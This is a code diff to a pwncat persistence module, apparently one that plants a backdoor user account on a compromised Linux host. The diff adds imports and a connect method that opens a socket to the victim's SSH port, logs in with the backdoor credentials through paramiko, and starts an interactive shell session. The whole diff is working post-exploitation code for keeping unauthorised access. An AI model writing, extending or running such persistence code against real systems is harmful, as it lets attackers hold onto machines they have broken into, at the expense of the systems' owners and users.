@@ -1,9 +1,12 @@
 #!/usr/bin/env python3
+import socket
 import crypt
 
+import paramiko
+
 import pwncat
-from pwncat.modules import Argument
-from pwncat.modules.persist import PersistType, PersistModule, PersistError
+from pwncat.modules import Argument, Status, PersistType, PersistError
+from pwncat.modules.persist import PersistModule
 
 
 class Module(PersistModule):
@@ -95,6 +98,42 @@ class Module(PersistModule):
 
         # Reload the user database
         pwncat.victim.reload_users()
+
+    def connect(self, user, backdoor_user, backdoor_pass, shell):
+
+        try:
+            yield Status("connecting to host")
+            # Connect to the remote host's ssh server
+            sock = socket.create_connection((pwncat.victim.host.ip, 22))
+        except Exception as exc:
+            raise PersistError(str(exc))
+
+        # Create a paramiko SSH transport layer around the socket
+        yield Status("wrapping socket in ssh transport")
+        t = paramiko.Transport(sock)
+        try:
+            t.start_client()
+        except paramiko.SSHException:
+            raise PersistError("ssh negotiation failed")
+
+        # Attempt authentication
+        try:
+            yield Status("authenticating with victim")
+            t.auth_password(backdoor_user, backdoor_pass)
+        except paramiko.ssh_exception.AuthenticationException:
+            raise PersistError("incorrect password")
+
+        if not t.is_authenticated():
+            t.close()
+            sock.close()
+            raise PersistError("incorrect password")
+
+        # Open an interactive session
+        chan = t.open_session()
+        chan.get_pty()
+        chan.invoke_shell()
+
+        yield chan
 
     def escalate(self, user, backdoor_user, backdoor_pass, shell):
         """ Utilize this module to escalate """
